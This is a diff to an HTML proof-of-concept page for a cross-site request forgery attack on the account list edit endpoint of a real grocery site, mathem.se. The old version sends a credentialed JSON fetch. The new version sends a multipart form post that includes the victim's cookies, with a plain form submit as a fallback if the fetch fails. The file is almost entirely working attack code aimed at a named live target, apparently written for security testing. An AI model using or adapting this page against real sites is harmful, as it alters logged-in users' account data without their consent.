@@ -1,39 +1,49 @@
 <!DOCTYPE html>
-<html>
-  <head>
-    <title>CSRF Exploit PoC</title>
-  </head>
-  <body>
-    <h1>CSRF Exploit Test</h1>
-    <button onclick="sendCSRF()">Submit Exploit</button>
-    
-    <p id="status"></p>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <title>CSRF PoC with Submit & Error Feedback</title>
+</head>
+<body>
+  <h1>CSRF PoC using multipart/form-data</h1>
+  
+  <form id="csrfForm" action="https://www.mathem.se/se/account/lists/edit/" method="POST" enctype="multipart/form-data">
+    <input type="text" name="title" value="CSRF Attack" />
+    <textarea name="description" style="display:none;">This was changed via CSRF PoC using multipart/form-data</textarea>
+    <input type="submit" value="Submit CSRF" />
+  </form>
 
-    <script>
-      function sendCSRF() {
-        fetch("https://www.mathem.se/se/account/lists/edit/", {
-          method: "POST",
-          credentials: "include", // ✅ sends cookies
-          headers: {
-            "Content-Type": "application/json"
-          },
-          body: JSON.stringify({
-            title: "CSRF attack",
-            description: "This was changed via a CSRF attack using CORS misconfig."
-          })
-        })
-        .then(response => {
-          document.getElementById("status").innerText = "Status: " + response.status;
-          return response.text();
-        })
-        .then(data => {
-          console.log("Server Response:", data);
-        })
-        .catch(error => {
-          document.getElementById("status").innerText = "Error: " + error;
-          console.error("Fetch Error:", error);
-        });
-      }
-    </script>
-  </body>
+  <p id="status"></p>
+
+  <script>
+    const form = document.getElementById('csrfForm');
+    const status = document.getElementById('status');
+
+    form.addEventListener('submit', function(event) {
+      event.preventDefault(); // prevent default form submit
+      
+      const formData = new FormData(form);
+
+      fetch(form.action, {
+        method: 'POST',
+        credentials: 'include',
+        body: formData
+      })
+      .then(response => {
+        status.textContent = 'Response status: ' + response.status;
+        return response.text();
+      })
+      .then(text => {
+        console.log('Response body:', text);
+      })
+      .catch(error => {
+        status.textContent = 'Error: ' + error;
+        console.error('Fetch error:', error);
+        // fallback: do a normal submit if fetch fails
+        form.removeEventListener('submit', arguments.callee);
+        form.submit();
+      });
+    });
+  </script>
+</body>
 </html>
